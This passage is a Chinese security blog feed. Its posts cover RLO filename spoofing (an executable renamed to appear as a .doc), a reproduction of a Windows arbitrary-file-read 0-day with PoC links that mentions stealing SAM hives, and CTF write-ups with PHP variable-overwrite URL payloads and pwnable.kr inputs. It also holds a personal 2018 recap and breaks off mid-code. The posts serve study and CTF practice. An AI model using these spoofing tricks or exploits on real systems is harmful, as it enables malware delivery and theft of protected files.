    <content type="html"><![CDATA[<h1 id="RLO"><a href="#RLO" class="headerlink" title="RLO"></a>RLO</h1><p>RLO是微软的中东Unicode字符（Middleeast<br>Unicode）中的一个，Unicode编码为0x202E，其作用是强制其后的字符变为从右到左的方式显示，一般用于中东语言（如阿拉伯语）的强制显示，但是在非中东语言中Explorer遇到此字符仍然是默认右-左显示，例如本來”setup-txt.exe”这样的文件名,在txt前面插入RLO控制字符之后变成”setup-exe.txt”<br>这个时候我们就发现这个东西岂不是可以隐藏我们的文件名，至少可以在视觉角度上，我上网搜了一下，RLO文件名欺骗这个东西已经很多年了，而且利用在病毒木马的攻击中也非常多<br>也可以发现有很多的APT攻击都有RLO的影子，本来是老东西了，但是到目前为止仍然是存在很大风险的，并且如果在增加一些东西更可以会“弄假成真”</p><h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><p><strong>0x00</strong></p><p>下了一个evething来做实验，首先将名字改成<code>补考名单.exe</code></p><p><img src="https://www.superbed.cn/pic/5c452d495f3e509ed94a1b7e" alt=""></p><p><strong>0x01</strong></p><p>在补考名单的后面加上<code>cod</code>,注意要反过来,再选插入unicode-&gt;RLO</p><p><img src="https://www.superbed.cn/pic/5c452d495f3e509ed94a1b7a" alt=""></p><p><strong>0x02</strong></p><p><img src="https://www.superbed.cn/pic/5c452d495f3e509ed94a1b78" alt=""></p><p>成功，后缀名改成了doc</p><p><img src="https://www.superbed.cn/pic/5c452d495f3e509ed94a1b76" alt=""></p><p>但是点开就是应用程序，实现欺骗的目的</p><p><strong>参考</strong></p><p><a href="https://blog.csdn.net/mgxcool/article/details/50637346" target="_blank" rel="noopener">https://blog.csdn.net/mgxcool/article/details/50637346</a></p><p><a href="https://www.je2se.com/archives/388" target="_blank" rel="noopener">https://www.je2se.com/archives/388</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RLO&quot;&gt;&lt;a href=&quot;#RLO&quot; class=&quot;headerlink&quot; title=&quot;RLO&quot;&gt;&lt;/a&gt;RLO&lt;/h1&gt;&lt;p&gt;RLO是微软的中东Unicode字符（Middleeast&lt;br&gt;Unicode）中的一个，Unicode编码为0x202E，其作用
      
    
    </summary>
    
    
      <category term="apt" scheme="https://threst.github.io/tags/apt/"/>
    
  </entry>
  
  <entry>
    <title>2018流水账</title>
    <link href="https://threst.github.io/2018/12/31/2018%E6%B5%81%E6%B0%B4%E8%B4%A6/"/>
    <id>https://threst.github.io/2018/12/31/2018流水账/</id>
    <published>2018-12-31T04:12:12.000Z</published>
    <updated>2018-12-31T13:23:21.831Z</updated>
    
    <content type="html"><![CDATA[<pre><code>南方的一场大雪带给空间，朋友圈欢乐也悄悄的带走了2018对138亿年的宇宙来说它不过是叠加的一层浮光掠影而对你我而言它是人生注定去不复返的一年一年就这么过去了我想应该写些什么作为一个人类是有限的但也有手段可以以一种形式较长时间的存在我留下些东西或许可以像那些逝者一般帮助其它能遇上的人做一个讲述者 尽量地不消失在这个世界这是此间存在的意义要过去了时间从不回头我们也只能硬着头皮往前走反正除了这一生我们又没有别的时间反正你我迟早都会失去人生的记忆是靠瞬间串起的在有限的时间里在和这世界相处的过程中愿我们能拥有更多瞬间也都能在此生玩得尽兴？</code></pre><h2 id="404分类"><a href="#404分类" class="headerlink" title="404分类"></a>404分类</h2><ul><li style="list-style: none"><input type="checkbox" checked> 投稿</li><li style="list-style: none"><input type="checkbox" checked> 跟大佬们去南(gong)京(fei)打(lv)比(you)赛</li></ul><h2 id="关于搬运"><a href="#关于搬运" class="headerlink" title="关于搬运"></a>关于搬运</h2><ul><li><a href="https://www.secpulse.com/archives/author/threst" target="_blank" rel="noopener">https://www.secpulse.com/archives/author/threst</a></li><li><a href="https://www.anquanke.com/member/131567" target="_blank" rel="noopener">https://www.anquanke.com/member/131567</a></li><li><a href="http://www.freebuf.com/author/%E5%91%A8%E5%A4%A7%E6%B6%9B" target="_blank" rel="noopener">http://www.freebuf.com/author/%E5%91%A8%E5%A4%A7%E6%B6%9B</a></li></ul><h2 id="关于编程"><a href="#关于编程" class="headerlink" title="关于编程"></a>关于编程</h2><p>1.xq17带坑的,bugsacn,补天上面的插件</p><p>2.学校的各种代码都放在github上面了</p><h2 id="关于影视"><a href="#关于影视" class="headerlink" title="关于影视"></a>关于影视</h2><ul><li style="list-style: none"><input type="checkbox" checked> 神盾局特工1-5</li><li style="list-style: none"><input type="checkbox" checked> 钢的琴 @done (18-03-11 19:13)</li><li style="list-style: none"><input type="checkbox" checked> 缝纫机乐队 @done (18-03-30 18:38)</li><li style="list-style: none"><input type="checkbox" checked> 万物理论 @done (18-03-30 18:38)</li><li style="list-style: none"><input type="checkbox" checked> 太空救援 @done (18-04-03 10:53)</li><li style="list-style: none"><input type="checkbox" checked> 听风者 @done (18-04-05 20:59)</li><li style="list-style: none"><input type="checkbox" checked> 我，花样女王 @done (18-04-06 21:32)</li><li style="list-style: none"><input type="checkbox" checked> 驴得水 @done (18-04-13 21:28)</li><li style="list-style: none"><input type="checkbox" checked> 红海行动 @done (18-05-06 17:34)</li><li style="list-style: none"><input type="checkbox" checked> 北京遇上西雅图 @done (18-05-11 21:18)</li><li style="list-style: none"><input type="checkbox" checked> 复仇者联盟3 @done (18-05-13 13:14)</li><li style="list-style: none"><input type="checkbox" checked> 黑豹 @done (18-05-18 22:15)</li><li style="list-style: none"><input type="checkbox" checked> 雷神1 @done (18-05-26 21:47)</li><li style="list-style: none"><input type="checkbox" checked> 无问西东 @done (18-06-23 10:33)</li><li style="list-style: none"><input type="checkbox" checked> 我不是药神 @done (18-07-08 11:44)</li><li style="list-style: none"><input type="checkbox" checked> 破风 @done (18-07-13 11:44)</li><li style="list-style: none"><input type="checkbox" checked> 超时空同居 @done (18-07-26 10:53)</li><li style="list-style: none"><input type="checkbox" checked> 雷神2 @done (18-07-29 11:00)</li><li style="list-style: none"><input type="checkbox" checked> 雷神3 @done (18-07-29 11:00)</li><li style="list-style: none"><input type="checkbox" checked> 西红柿首富 @done (18-08-03 21:37)</li><li style="list-style: none"><input type="checkbox" checked> 心花路放 @done (18-08-11 17:40)</li><li style="list-style: none"><input type="checkbox" checked> 地心引力 @done (18-08-12 20:39)</li><li style="list-style: none"><input type="checkbox" checked> 一出好戏 @done (18-08-17 20:39)</li><li style="list-style: none"><input type="checkbox" checked> 龙虾刑警 @done (18-08-20 22:42)</li><li style="list-style: none"><input type="checkbox" checked> 异星崛起 @done (18-08-21 22:43)</li><li style="list-style: none"><input type="checkbox" checked> 邪不压正 @done (18-08-24 22:04)</li><li style="list-style: none"><input type="checkbox" checked> 寒站2 @done (18-08-25 22:05)</li><li style="list-style: none"><input type="checkbox" checked> 黄飞鸿之英雄有梦 @done (18-08-26 09:33)</li><li style="list-style: none"><input type="checkbox" checked> 剩者为王 @done (18-08-27 19:29)</li><li style="list-style: none"><input type="checkbox" checked> 蚁人 @done (18-08-27 19:30)</li><li style="list-style: none"><input type="checkbox" checked> 蚁人2 @done (18-09-07 19:58)</li><li style="list-style: none"><input type="checkbox" checked> 死侍2 @done (18-09-08 22:03)</li><li style="list-style: none"><input type="checkbox" checked> 追龙 @done (18-10-04 22:10)</li><li style="list-style: none"><input type="checkbox" checked> 超人总动员2 @done (18-10-26 20:21)</li><li style="list-style: none"><input type="checkbox" checked> 人类清除计划4 @done (18-10-27 20:21)</li><li style="list-style: none"><input type="checkbox" checked> 毒液 @done (18-11-20 17:59)</li><li style="list-style: none"><input type="checkbox" checked> 无名之辈 @done (18-12-02 19:21)</li><li style="list-style: none"><input type="checkbox" checked> 蜘蛛侠:平新宇宙 @done (18-12-31 14:40)</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;南方的一场大雪
带给空间，朋友圈欢乐
也悄悄的带走了2018
对138亿年的宇宙来说
它不过是叠加的一层浮光掠影
而对你我而言
它是人生注定去不复返的一年
一年就这么过去了
我想应该写些什么
作为一个人类
是有限的
但也有手段
可以以一种形式较长时间的存在

      
    
    </summary>
    
    
      <category term="瞎记罢写" scheme="https://threst.github.io/tags/%E7%9E%8E%E8%AE%B0%E7%BD%A2%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>readfile-0day复现</title>
    <link href="https://threst.github.io/2018/12/23/readfile0day/"/>
    <id>https://threst.github.io/2018/12/23/readfile0day/</id>
    <published>2018-12-23T05:32:13.000Z</published>
    <updated>2018-12-31T13:29:38.810Z</updated>
    
    <content type="html"><![CDATA[<p>poc:下载<br><a href="http://sandboxescaper.blogspot.com/2018/12/readfile-0day.html" target="_blank" rel="noopener">http://sandboxescaper.blogspot.com/2018/12/readfile-0day.html</a><br><a href="http://www.filedropper.com/readfile" target="_blank" rel="noopener">http://www.filedropper.com/readfile</a><br>ReadFile函数:<br><a href="https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-readfile" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-readfile</a><br>新闻:<a href="https://www.bleepingcomputer.com/news/security/windows-zero-day-poc-lets-you-read-any-file-with-system-level-access/" target="_blank" rel="noopener">https://www.bleepingcomputer.com/news/security/windows-zero-day-poc-lets-you-read-any-file-with-system-level-access/</a></p><p>##　漏洞描述<br>该错误发生在“MsiAdvertiseProduct”中<br>调用此函数将导致安装程序服务进行文件复制。<br>这会将我们可以用第一个参数控制的任意文件复制到c:\windows\installer …模拟时进行检查，但是使用联结仍然有一个TOCTOU …这意味着我们可以将它复制到SYSTEM ，目标文件将始终可读。这导致任意文件读取漏洞。<br>重现：<br>确保同时复制readfile.exe和“file”（位于文件夹PoC-Files下）…并将它们放在同一目录中。<br>用法：readfile.exe targetfile（其中targetfile是要读取的文件，IE：“readfile.exe c:\users\test\desktop\desktop.ini”)<br>在2核或更多核上运行，这应该在一个核心上进行一些修改…因为你应该能够用oplocks来达到计时（但我很懒）..你应该能够看到这样的东西，如果它有效：<a href="https://www.youtube.com/watch?v=x4P2H64GI1o" target="_blank" rel="noopener">https://www.youtube.com/watch?v=x4P2H64GI1o</a><br>确认错误的最简单方法是创建两个本地帐户并读取另一个帐户的desktop.ini。<br>即使没有枚举向量，这仍然是坏消息，因为许多文档软件，如office，实际上会将文件保存在静态位置，其中包含最近打开的文档的完整路径和文件名。因此，通过读取这样的文件，你可以获取由其他用户创建的文档的文件名..文件系统是一个spiderweb，并且可以在任何地方找到对用户创建的文件的引用..所以没有枚举错误并不是那么大的交易。<br>如果启用了卷影副本，你可以明显地窃取SAM和SYSTEM hive我认为……<br>也许还有一些其他的用例..但我不是很聪明，所以我不知道。</p><h2 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h2><p>1.新建一个test普通用户<br>2.将poc解压<br>3.<code>C:\Users\test\Desktop\PoC-Files&gt;Readfile.exe C:\Users\threst\Desktop\key.ps1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;poc:下载&lt;br&gt;&lt;a href=&quot;http://sandboxescaper.blogspot.com/2018/12/readfile-0day.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://sandboxescaper.bl
      
    
    </summary>
    
    
      <category term="0day" scheme="https://threst.github.io/tags/0day/"/>
    
  </entry>
  
  <entry>
    <title>2018鹏城杯Myblog思考</title>
    <link href="https://threst.github.io/2018/12/20/2018%E9%B9%8F%E5%9F%8E%E6%9D%AFMyblog%E6%80%9D%E8%80%83/"/>
    <id>https://threst.github.io/2018/12/20/2018鹏城杯Myblog思考/</id>
    <published>2018-12-20T05:32:13.000Z</published>
    <updated>2018-12-31T13:29:28.708Z</updated>
    
    <content type="html"><![CDATA[<p>直接给出源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = <span class="string">'flag.txt'</span>;</span><br><span class="line">$flag = <span class="string">'flag.txt'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($sign))&#123;</span><br><span class="line">    $file = trim(file_get_contents($filename));</span><br><span class="line">    <span class="keyword">if</span>($sign === $file)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Congratulation!&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($$falg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'don`t give up'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先这个考了两个点，第一个是变量覆盖，第二个是php的可变变量,第一个好绕过直接传参的时候赋值就行</p><p><code>http://127.0.0.1/pc.php?sign=&amp;filename==1</code><br>可以绕过，但是没有flag,只有<code>Congratulation</code></p><p>接下来就是绕过第二个可变变量。</p><p>举个例子<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'hello'</span>;</span><br><span class="line">$$a = <span class="string">'world'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>那么<code>$a</code>–&gt;hello,<code>$hello</code>–&gt;world</p><p>那么我们这么想，我们要把flag.txt的值给<code>$falg</code>,但是不能直接给，但是直接给不了!我们尝试使用第三方，随便弄个<code>f</code>变量来承担这一艰巨的任务</p><p>大致流程:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$falg--&gt;$f                        //把值给f</span><br><span class="line">$f--&gt;flag.txt                      //flag.txt的值给f</span><br></pre></td></tr></table></figure></p><p>尝试以下的paylaod都可以<br>paylaod:<br><code>http://127.0.0.1/pc.php?sign=&amp;filename=expect://&amp;falg=f&amp;f=flag.txt</code><br><code>http://127.0.0.1/pc.php?sign=&amp;filename=php://filter&amp;falg=f&amp;f=flag.txt</code><br><code>http://127.0.0.1/pc.php?sign=&amp;filename=php://input&amp;falg=f&amp;f=flag.txt</code></p><h2 id="瞎编改题"><a href="#瞎编改题" class="headerlink" title="瞎编改题"></a>瞎编改题</h2><p>将代码改成这要,去掉一个<code>$</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = <span class="string">'flag.txt'</span>;</span><br><span class="line">$flag = <span class="string">'flag.txt'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($sign))&#123;</span><br><span class="line">    $file = trim(file_get_contents($filename));</span><br><span class="line">    <span class="keyword">if</span>($sign === $file)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Congratulation!&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($falg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'don`t give up'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这样就不需要第三方的的<code>f</code>来做红娘了,直接把flag.txt的数据给falg,再使用<code>php://input</code>来读取就ok</p><p>payload:<br><code>http://127.0.0.1/pc.php?sign=&amp;filename=php://input=falg&amp;falg=flag.txt</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;直接给出源码&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwnable_collision</title>
    <link href="https://threst.github.io/2018/12/18/pwnable_collision/"/>
    <id>https://threst.github.io/2018/12/18/pwnable_collision/</id>
    <published>2018-12-18T05:32:13.000Z</published>
    <updated>2018-12-31T13:29:02.113Z</updated>
    
    <content type="html"><![CDATA[<p>12.18<br>Daddy told me about cool MD5 hash collision today.<br>I wanna do something like that too!<br>地址:ssh <a href="mailto:col@pwnable.kr" target="_blank" rel="noopener">col@pwnable.kr</a> -p2222 (pw:guest)</p><p>题目源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">        res += ip[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="这个程序大致的流程就是"><a href="#这个程序大致的流程就是" class="headerlink" title="这个程序大致的流程就是:"></a>这个程序大致的流程就是:</h3><p>1.用户输入20个char字符<br>2.然后经过<code>check_password</code>函数将20个字符转化为５个int型的数字(每个数字占4个字节)<br>3.再将５个数字相加，是否等于<code>hashcode</code><br>4.<code>hashcode</code>的值为<code>0x21DD09EC</code>,转化为十进制就是<code>568134124</code></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路:"></a>解题思路:</h3><p>1.将２０个字符分为２个部分<br>2.前16个字符全是0x02,那么就是<code>0x02020202</code><em>4<br>3.为了保证５个整数之和为<code>hashcode</code>,后４个字符为`hex(0x21DD09EC-(0x02020202</em>4))<code>4.得到后４个字符为</code>0x19d501e4`</p><p>那么我们的payload就是<br><code>python -c &quot;print &#39;\x02\x02\x02\x02&#39;*4 + &#39;\x19\xd5\x01\xe4&#39;&quot;</code><br>但是经过尝试，失败了,</p><p>原来是数字在内存中是按照小端序存储，所以将payload修改成这样:<br><code>python -c &quot;print &#39;\x02\x02\x02\x02&#39;*4 + &#39;\xe4\x01\xd5\x19&#39;&quot;</code></p><p><a href="https://api.superbed.cn/pic/5c18908ac4ff9e2b4e04502a" target="_blank" rel="noopener">https://api.superbed.cn/pic/5c18908ac4ff9e2b4e04502a</a></p><p>flag:<code>daddy! I just managed to create a hash collision :)</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;12.18&lt;br&gt;Daddy told me about cool MD5 hash collision today.&lt;br&gt;I wanna do something like that too!&lt;br&gt;地址:ssh &lt;a href=&quot;mailto:col@pwnable.
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://threst.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable_fd</title>
    <link href="https://threst.github.io/2018/12/18/pwnable_fd/"/>
    <id>https://threst.github.io/2018/12/18/pwnable_fd/</id>
    <published>2018-12-18T05:32:13.000Z</published>
    <updated>2018-12-31T13:29:09.955Z</updated>
    
    <content type="html"><![CDATA[<p>题目:ssh <a href="mailto:fd@pwnable.kr" target="_blank" rel="noopener">fd@pwnable.kr</a> -p2222 (pw:guest)</p><p>源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="几个函数的说明"><a href="#几个函数的说明" class="headerlink" title="几个函数的说明:"></a>几个函数的说明:</h4><p>1.<code>atoi()</code>函数用来将字符串转换成整数(int)，其原型为：<code>int atoi (const char * str);</code><br>2.<code>定义函数：ssize_t read(int fd, void * buf, size_t count);</code>,read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read()不会有作用并返回0。返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动。<br>3.strcmp()如果返回值 = 0，则表示 str1 等于 str2。<br>4.局部变量fd表示文件描述符，为read所使用。<br>5.fd是由atoi(argv[1])-0x1234计算出来的，其中argv[1]可控，且程序没有做任何check。<br>6.read的<code>dst buffer</code>是一个全局的数组buf，大小定义为32，且read的第三个参数限定了32，不存在溢出。<br>7.Linux下stdin的定义在/usr/include/unistd.h中</p><p>参考大佬的<a href="https://r00tk1ts.github.io/2018/03/03/fd/" target="_blank" rel="noopener">博客</a>,得知fd为文件描述符,关于文件描述符可以参考这篇<a href="https://blog.csdn.net/cywosp/article/details/38965239" target="_blank" rel="noopener">文章</a>,liunx中一切都可以看做文件，这个题目要求<code>buf</code>为<code>LETMEWIN</code>才可以输出flag,所以我们要把<code>fd</code>的文件描述符修改为0，那么我们就可以标准输入<code>LETMEWIN</code>,在看<code>int fd = atoi( argv[1] ) - 0x1234;</code>这行，他将我们的输入减了<code>0x1234</code>,既然我们要他等于０，那么我们直接输入<code>4660(0x1234)</code>就可以了。</p><p><a href="https://api.superbed.cn/pic/5c18874fc4ff9e2b4e045009" target="_blank" rel="noopener">https://api.superbed.cn/pic/5c18874fc4ff9e2b4e045009</a></p><p>flag:<code>mommy! I think I know what a file descriptor is!!</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目:ssh &lt;a href=&quot;mailto:fd@pwnable.kr&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;fd@pwnable.kr&lt;/a&gt; -p2222 (pw:guest)&lt;/p&gt;
&lt;p&gt;源码&lt;br&gt;&lt;figure class=&quot;high
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://threst.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>hackagame2018</title>
    <link href="https://threst.github.io/2018/11/22/hackagame2018/"/>
    <id>https://threst.github.io/2018/11/22/hackagame2018/</id>
    <published>2018-11-22T05:32:13.000Z</published>
    <updated>2018-12-31T13:18:16.385Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.secpulse.com/archives/82450.html" target="_blank" rel="noopener">文章首发安全脉搏</a></p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>修改js中控制个数的位数，</p><h2 id="word文档"><a href="#word文档" class="headerlink" title="word文档"></a>word文档</h2><p>直接打开就有flag.txt</p><h2 id="黑曜石浏览器"><a href="#黑曜石浏览器" class="headerlink" title="黑曜石浏览器"></a>黑曜石浏览器</h2><p>请使用最新版黑曜石浏览器（HEICORE）打开。</p><p>搜索到这个浏览器，一看就是假的，无法直接查看源代码，在url前面添加<code>view-source:</code>,注意要看<code>.html</code>的源代码，不是<code>.php</code>的，因为这个是４０４页面</p><p>view-source:<a href="https://heicore.com/index.html" target="_blank" rel="noopener">https://heicore.com/index.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">      function isLatestHEICORE() &#123;</span><br><span class="line">          var ua = navigator.userAgent;</span><br><span class="line">          var HEICORE_UA = &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36&quot;;</span><br><span class="line">          return ua === HEICORE_UA;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></p><h2 id="回到过去"><a href="#回到过去" class="headerlink" title="回到过去"></a>回到过去</h2><p>源文件如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">q</span><br><span class="line">ed</span><br><span class="line">a</span><br><span class="line">flag&#123;</span><br><span class="line">.</span><br><span 